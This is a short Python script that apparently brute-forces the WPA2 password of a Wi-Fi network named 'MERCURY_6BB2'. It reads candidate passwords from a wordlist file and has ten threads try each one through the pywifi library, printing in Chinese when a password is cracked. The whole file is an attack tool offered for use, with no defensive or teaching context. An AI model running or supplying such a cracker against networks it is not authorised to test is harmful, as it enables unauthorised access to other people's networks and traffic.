# @Author  : ShiRui
import pywifi
import time
import threading
from pywifi import const
import queue


class Wifi:

	def product(self):

		while True:

			password = file.readline()
			q.put(password)

	def consumerPassword(self):

		while True:

			password = q.get()
			Flage = self.wifiConnect(password)

			if Flage:
				print("密码破解成功", password)
				break

			else:
				print("密码不正确", password)

	def wifiConnect(self, password):

			wifi = pywifi.PyWiFi()
			ifaces = wifi.interfaces()[0]
			ifaces.disconnect()
			time.sleep(1)
			wifi_status = ifaces.status()
			if wifi_status == const.IFACE_DISCONNECTED:

				print("wifi没有连接")
				profile = pywifi.Profile()
				profile.ssid = 'MERCURY_6BB2'
				profile.auth = const.AUTH_ALG_OPEN
				profile.akm.append(const.AKM_TYPE_WPA2PSK)
				profile.cipher = const.CIPHER_TYPE_CCMP
				profile.key = password
				ifaces.remove_all_network_profiles()

				new_profile = ifaces.add_network_profile(profile)

				ifaces.connect(new_profile)
				time.sleep(4)

				if ifaces.status() == const.IFACE_CONNECTED:

					return True

				else:

					return False

			else:
				print("已经连接wifi！")


if __name__ == "__main__":

	file = open('password.txt')
	q = queue.Queue(maxsize=1000)
	thread = []

	wifi = Wifi()

	p = threading.Thread(target=wifi.product)
	p.start()

	for i in range(10):

		c = threading.Thread(target=wifi.consumerPassword)
		thread.append(c)

	for t in thread:

		t.start()
